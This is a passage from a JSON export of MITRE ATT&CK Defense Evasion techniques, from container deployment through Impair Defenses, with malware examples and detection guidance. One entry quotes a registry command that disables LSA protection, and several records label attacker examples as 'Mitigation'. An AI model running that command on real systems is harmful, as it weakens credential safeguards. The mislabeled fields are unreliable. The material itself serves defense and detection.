        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda decrypts strings in the code during the execution process.[274]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.[275]"
      },
      {
        "id": "S1013",
        "name": "ZxxZ",
        "description": "ZxxZ has used a XOR key to decrypt strings.[276]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files for unexpected modifications that attempt to hide artifacts. On Windows, Event ID 4663 (Security Log - An attempt was made to access an object) can be used to alert on suspicious file accesses (e.g., attempting to write to a file which shouldn’t be further modified) that may coincide with attempts to hide artifacts."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that attempt to hide artifacts of an intrusion, such as common archive file applications and extensions (ex: Zip and RAR archive tools), and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.CertUtil.exe may be used to encode and decode a file, including PE and script code. Encoding will convert a file to base64 with -----BEGIN CERTIFICATE----- and -----END CERTIFICATE----- tags. Malicious usage will include decoding an encoded file that was downloaded. Once decoded, it will be loaded by a parallel process. Note that there are two additional command switches that may be used - encodehex and decodehex. Similarly, the file will be encoded in HEX and later decoded for further execution. During triage, identify the source of the file being decoded. Review its contents or execution behavior for further analysis.Analytic Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The analytic is oriented around the creation of CertUtil.exe processes, which may be used to encode and decode files, including PE and script code. Malicious usage will include decoding a encoded file that was downloaded. Once decoded, it will be loaded by a parallel process. Analytic 1 - CertUtil with Decode Argument  processes = filter processes where (  (event_id == \"1\" OR event_id == \"4688\") AND  exe =\"C:\\Windows\\System32\\certutil.exe\" AND  command_line = decode )"
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Deploy Container",
    "Code": "T1610",
    "Description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.Containers can be deployed by various means, such as via Docker's create and start APIs or via a web application such as the Kubernetes dashboard or Kubeflow.[1][2][3] Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.[4]",
    "Mitigation": [
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki was run through a deployed container.[5]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing was run through a deployed Ubuntu container.[6]"
      },
      {
        "id": "S0683",
        "name": "Peirates",
        "description": "Peirates can deploy a pod that mounts its node’s root file system, then execute a command to create a reverse shell on the node.[7]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has deployed different types of containers into victim environments to facilitate execution.[8][9] TeamTNT has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges.[10]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Configuration management databases (CMDB) and other asset management systems may help with the detection of computer systems or network devices that should not exist on a network."
      },
      {
        "id": "DS0032",
        "dsource": "Container",
        "dcomp": "Container Creation",
        "detects": "Monitor for newly constructed containers that may deploy a container into an environment to facilitate execution or evade defenses."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Container Start",
        "detects": "Monitor for activation or invocation of a container that may deploy a container into an environment to facilitate execution or evade defenses."
      },
      {
        "id": "DS0014",
        "dsource": "Pod",
        "dcomp": "Pod Creation",
        "detects": "Monitor for newly constructed pods that may deploy a container into an environment to facilitate execution or evade defenses."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Pod Modification",
        "detects": "Monitor for changes made to pods for unexpected modifications to settings and/or control data that may deploy a container into an environment to facilitate execution or evade defenses."
      }
    ],
    "Subtechniques": "DefenseEvasion, Execution"
  },
  {
    "Title": "Direct Volume Access",
    "Code": "T1006",
    "Description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. [1]Utilities, such as NinjaCopy, exist to perform these actions in PowerShell.[2] Adversaries may also use built-in or third-party utilities (such as vssadmin, wbadmin, and esentutl) to create shadow copies or backups of data from system volumes.[3]",
    "Mitigation": [
      {
        "id": "S0404",
        "name": "esentutl",
        "description": "esentutl can use the Volume Shadow Copy service to copy locked files such as ntds.dit.[3][4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through PowerShell, additional logging of PowerShell scripts is recommended."
      },
      {
        "id": "DS0016",
        "dsource": "Drive",
        "dcomp": "Drive Access",
        "detects": "Monitor handle opens on volumes that are made by processes to determine when they may be directly collecting data from logical drives. [2]"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for the creation of volume shadow copy and backup files, especially unexpected and irregular activity (relative to time, user, etc.)."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Domain Policy Modification",
    "Code": "T1484",
    "Description": "Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious Scheduled Task to computers throughout the domain environment[1][2][3] or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.[4] Adversaries can also change configuration settings within the AD environment to implement a Rogue Domain Controller.Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",
    "Mitigation": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": "Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as BloodHound (version 1.5.1 and later)[5]."
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Use least privilege and protect administrative access to the Domain Controller and Active Directory Federation Services (AD FS) server. Do not create service accounts with administrative privileges."
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": "Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to.[2][6][7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Creation",
        "detects": "Monitor for newly constructed active directory objects, such as Windows EID 5137."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Active Directory Object Deletion",
        "detects": "Monitor for unexpected deletion of an active directory object, such as Windows EID 5141."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made to AD settings for unexpected modifications to user accounts, such as deletions or potentially malicious changes to user attributes (credentials, status, etc.)."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes Set federation settings on domain and Set domain authentication.[8][9]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1484.001",
        "name": "Group Policy Modification"
      },
      {
        "id": "T1484.002",
        "name": "Domain Trust Modification"
      }
    ],
    "Tactic": "DefenseEvasion, PrivilegeEscalation"
  },
  {
    "Title": "Execution Guardrails",
    "Code": "T1480",
    "Description": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.[1] Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.[2]Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",
    "Mitigation": [
      {
        "id": "S0504",
        "name": "Anchor",
        "description": "Anchor can terminate itself if specific execution flags are not present.[3]"
      },
      {
        "id": "S0570",
        "name": "BitPaymer",
        "description": "BitPaymer compares file names and paths to a list of excluded names and directory names during encryption.[4]"
      },
      {
        "id": "S0635",
        "name": "BoomBox",
        "description": "BoomBox can check its current working directory and for the presence of a specific file and terminate if specific values are not found.[5]"
      },
      {
        "id": "S1052",
        "name": "DEADEYE",
        "description": "DEADEYE can ensure it executes only on intended systems by identifying the victim's volume serial number, hostname, and/or DNS domain.[6]"
      },
      {
        "id": "S0634",
        "name": "EnvyScout",
        "description": "EnvyScout can call window.location.pathname to ensure that embedded files are being executed from the C: drive, and will terminate if they are not.[5]"
      },
      {
        "id": "S0637",
        "name": "NativeZone",
        "description": "NativeZone can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components.[5][7]"
      },
      {
        "id": "S1035",
        "name": "Small Sieve",
        "description": "Small Sieve can only execute correctly if the word Platypus is passed to it on the command line.[8]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet checks for specific operating systems on 32-bit machines, Registry keys, and dates for vulnerabilities, and will exit execution if the values are not met.[9]"
      },
      {
        "id": "S0562",
        "name": "SUNSPOT",
        "description": "SUNSPOT only replaces SolarWinds Orion source code if the MD5 checksums of both the original source code file and backdoored replacement source code match hardcoded values.[10]"
      },
      {
        "id": "S0678",
        "name": "Torisma",
        "description": "Torisma is only delivered to a compromised host if the victim's IP address is on an allow-list.[11]"
      },
      {
        "id": "S0636",
        "name": "VaporRage",
        "description": "VaporRage has the ability to check for the presence of a specific DLL and terminate if it is not found.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may gather information about the victim's business relationships that can be used during targeting. Detecting the use of guardrails may be difficult depending on the implementation."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. Detecting the use of guardrails may be difficult depending on the implementation."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1480.001",
        "name": "Environmental Keying"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Exploitation for Defense Evasion",
    "Code": "T1211",
    "Description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries [1], evade security logs [2], or deploy hidden infrastructure.[3]",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used CVE-2015-4902 to bypass security features.[4][5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for abnormal process creations, such as a Command and Scripting Interpreter spawning from a potentially exploited application. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "File and Directory Permissions Modification",
    "Code": "T1222",
    "Description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2] File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.[3][4][5][6][7]",
    "Mitigation": [
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Ensure critical system files as well as those known to be abused by adversaries have restrictive permissions and are owned by an appropriately privileged account, especially if access is not required by users nor will inhibit system functionality."
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": "Applying more restrictive permissions to files and directories could prevent adversaries from modifying their access control lists. Additionally, ensure that user settings regarding local and remote symbolic links are properly set or disabled where unneeded.[8]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes made to ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Metadata",
        "detects": "Monitor and investigate attempts to modify ACLs and file/directory ownership."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.[1][2]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1222.001",
        "name": "Windows File and Directory Permissions Modification"
      },
      {
        "id": "T1222.002",
        "name": "Linux and Mac File and Directory Permissions Modification"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Hide Artifacts",
    "Code": "T1564",
    "Description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.[1][2][3]Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.[4]",
    "Mitigation": [
      {
        "id": "S0482",
        "name": "Bundlore",
        "description": "Bundlore uses the mktemp utility to make unique file and directory names for payloads, such as TMP_DIR=`mktemp -d -t x.[5]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla has used %HiddenReg% and %HiddenKey% as part of its persistence via the Windows registry.[6]"
      },
      {
        "id": "S0402",
        "name": "OSX/Shlayer",
        "description": "OSX/Shlayer has used the mktemp utility to make random and unique filenames for payloads, such as export tmpDir=\"$(mktemp -d /tmp/XXXXXXXXXXXX)\" or mktemp -t Installer.[7][5][8]"
      },
      {
        "id": "S1011",
        "name": "Tarrask",
        "description": "Tarrask is able to create \"hidden\" scheduled tasks by deleting the Security Descriptor (SD) registry value.[9]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can masquerade the Process Environment Block on a compromised host to hide it's attempts to elevate privileges through IFileOperation.[10]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for third-party application logging, messaging, and/or other artifacts that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Metadata",
        "detects": "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "DS0001",
        "dsource": "Firmware",
        "dcomp": "Firmware Modification",
        "detects": "Monitor for changes made to firewall rules for unexpected modifications to allow/block specific network traffic that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Creation",
        "detects": "Monitor for newly constructed services/daemons that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Creation",
        "detects": "Monitor for newly constructed user accounts that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "User Account Metadata",
        "detects": "Monitor for contextual data about an account, which may include a username, user ID, environmental data that may attempt to hide artifacts associated with their behaviors to evade detection."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys and/or values that may attempt to hide artifacts associated with their behaviors to evade detection."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1564.001",
        "name": "Hidden Files and Directories"
      },
      {
        "id": "T1564.002",
        "name": "Hidden Users"
      },
      {
        "id": "T1564.003",
        "name": "Hidden Window"
      },
      {
        "id": "T1564.004",
        "name": "NTFS File Attributes"
      },
      {
        "id": "T1564.005",
        "name": "Hidden File System"
      },
      {
        "id": "T1564.006",
        "name": "Run Virtual Instance"
      },
      {
        "id": "T1564.007",
        "name": "VBA Stomping"
      },
      {
        "id": "T1564.008",
        "name": "Email Hiding Rules"
      },
      {
        "id": "T1564.009",
        "name": "Resource Forking"
      },
      {
        "id": "T1564.010",
        "name": "Process Argument Spoofing"
      },
      {
        "id": "T1564.011",
        "name": "Ignore Process Interrupts"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Hijack Execution Flow",
    "Code": "T1574",
    "Description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
    "Mitigation": [
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries.[1]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis replaces the nonexistent Windows DLL \"msfte.dll\" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.[2]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "One of Dtrack can replace the normal flow of a program execution with malicious code.[3]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may execute their own malicious payloads by hijacking the way operating systems run programs."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may execute their own malicious payloads by hijacking the way operating systems run programs."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Metadata",
        "detects": "Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys and/or values that may execute their own malicious payloads by hijacking the way operating systems run programs."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1574.001",
        "name": "DLL Search Order Hijacking"
      },
      {
        "id": "T1574.002",
        "name": "DLL Side-Loading"
      },
      {
        "id": "T1574.004",
        "name": "Dylib Hijacking"
      },
      {
        "id": "T1574.005",
        "name": "Executable Installer File Permissions Weakness"
      },
      {
        "id": "T1574.006",
        "name": "Dynamic Linker Hijacking"
      },
      {
        "id": "T1574.007",
        "name": "Path Interception by PATH Environment Variable"
      },
      {
        "id": "T1574.008",
        "name": "Path Interception by Search Order Hijacking"
      },
      {
        "id": "T1574.009",
        "name": "Path Interception by Unquoted Path"
      },
      {
        "id": "T1574.010",
        "name": "Services File Permissions Weakness"
      },
      {
        "id": "T1574.011",
        "name": "Services Registry Permissions Weakness"
      },
      {
        "id": "T1574.012",
        "name": "COR_PROFILER"
      },
      {
        "id": "T1574.013",
        "name": "KernelCallbackTable"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation, DefenseEvasion"
  },
  {
    "Title": "Impair Defenses",
    "Code": "T1562",
    "Description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.[1]Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",
    "Mitigation": [
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has disabled LSA protection on compromised hosts using \"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f.[2]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet reduces the integrity level of objects to allow write actions.[3]"
      }
    ],
    "Detection": [
      {
        "id": "DS0025",
        "dsource": "Cloud Service",
        "dcomp": "Cloud Service Disable",
        "detects": "Monitor logs for API calls to disable logging. In AWS, monitor for: StopLogging and DeleteTrail.[5] In GCP, monitor for: google.logging.v2.ConfigServiceV2.UpdateSink.[6] In Azure, monitor for az monitor diagnostic-settings delete.[7] Additionally, a sudden loss of a log source may indicate that it has been disabled."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Cloud Service Modification",
        "detects": "Monitor changes made to cloud services for unexpected modifications to settings and/or data."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms."
      },
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Load",
        "detects": "Monitor for unusual/suspicious driver activity, especially regarding EDR and drivers associated with security tools as well as those that may be abused to disable security products."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Deletion",
        "detects": "Monitor for missing log files hosts and services with known active periods."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor changes made to configuration files that contain settings for logging and defensive tools."
      },
      {
        "id": "DS0018",
        "dsource": "Firewall",
        "dcomp": "Firewall Disable",
        "detects": "Monitor for changes in the status of the system firewall such as Windows Security Auditing events 5025 (The Windows firewall service has been stopped) and 5034 (The Windows firewall driver was stopped)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Firewall Rule Modification",
        "detects": "Monitor for changes made to firewall rules for unexpected modifications to allow/block specific network traffic that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for the abnormal execution of API functions associated with system logging."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Modification",
        "detects": "Using another process or third-party tools, monitor for modifications or access to system processes associated with logging."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Termination",
        "detects": "Monitor for unexpected deletions of a running process (ex: Sysmon EID 5 or Windows EID 4689) that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms."
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      },
      {
        "id": "DS0013",
        "dsource": "Sensor Health",
        "dcomp": "Host Status",
        "detects": "Monitor logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications) that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. Lack of log events may be suspicious."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Metadata",
        "detects": "Monitor contextual data about a service/daemon, which may include information such as name, service executable, start type that that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Modification",
        "detects": "Monitor for changes to account settings associated with users/tenants that may impact defensive logging capabilities, such as the Update User and Change User License events in the Azure AD audit log.[8]"
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Deletion",
        "detects": "Monitor for unexpected deletion of windows registry keys that that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor Registry edits for modifications to services and startup programs that correspond to security tools."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1562.001",
        "name": "Disable or Modify Tools"
      },
      {
        "id": "T1562.002",
        "name": "Disable Windows Event Logging"
      },
      {
        "id": "T1562.003",
        "name": "Impair Command History Logging"
      },
      {
        "id": "T1562.004",
        "name": "Disable or Modify System Firewall"
      },
      {
        "id": "T1562.006",
        "name": "Indicator Blocking"
      },
      {
        "id": "T1562.007",
        "name": "Disable or Modify Cloud Firewall"
      },
      {
        "id": "T1562.008",
        "name": "Disable or Modify Cloud Logs"
      },
      {
        "id": "T1562.009",
        "name": "Safe Mode Boot"
      },
      {
        "id": "T1562.010",
        "name": "Downgrade Attack"
      },
      {
        "id": "T1562.011",
        "name": "Spoof Security Alerting"
      },
      {
        "id": "T1562.012",
        "name": "Disable or Modify Linux Audit System"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Impersonation",
    "Code": "T1656",
